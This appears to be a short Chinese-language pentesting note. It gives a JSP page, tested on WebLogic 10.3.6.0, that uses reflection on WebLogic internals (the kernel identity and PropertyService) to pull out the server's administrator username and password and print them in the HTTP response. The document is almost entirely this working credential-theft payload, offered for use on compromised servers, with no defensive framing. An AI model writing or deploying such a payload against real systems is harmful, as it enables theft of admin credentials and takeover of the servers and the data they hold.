Ref:
- https://github.com/pen4uin/awesome-java-security/tree/main/weblogic


获取weblogic的密码：
```jsp
<%@page import="java.lang.reflect.Field" %>
<%@page import="java.lang.reflect.Method" %>

<%
  /**
   * 已测试：
   *  10.3.6.0
   */
  try{
    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
    Class httpDataTransferHandler = classLoader.loadClass("weblogic.deploy.service.datatransferhandlers.HttpDataTransferHandler");
    Class managementService = classLoader.loadClass("weblogic.management.provider.ManagementService");
    Class authenticatedSubject = classLoader.loadClass("weblogic.security.acl.internal.AuthenticatedSubject");
    Class propertyService = classLoader.loadClass("weblogic.management.provider.PropertyService");
    Field KERNE_ID = httpDataTransferHandler.getDeclaredField("KERNE_ID");
    KERNE_ID.setAccessible(true);
    Method getPropertyService = managementService.getMethod("getPropertyService",authenticatedSubject);
    getPropertyService.setAccessible(true);
    Object prop = getPropertyService.invoke((Object) null,KERNE_ID.get((Object) null));
    Method getTimestamp1 = propertyService.getMethod("getTimestamp1");
    getTimestamp1.setAccessible(true);
    Method getTimestamp2 = propertyService.getMethod("getTimestamp2");
    getTimestamp2.setAccessible(true);
    String username = (String) getTimestamp1.invoke(prop);
    String password = (String) getTimestamp2.invoke(prop);
    response.getWriter().write( username + "/" + password);
  }catch (Exception e) {
    e.printStackTrace();
  }
%>
```
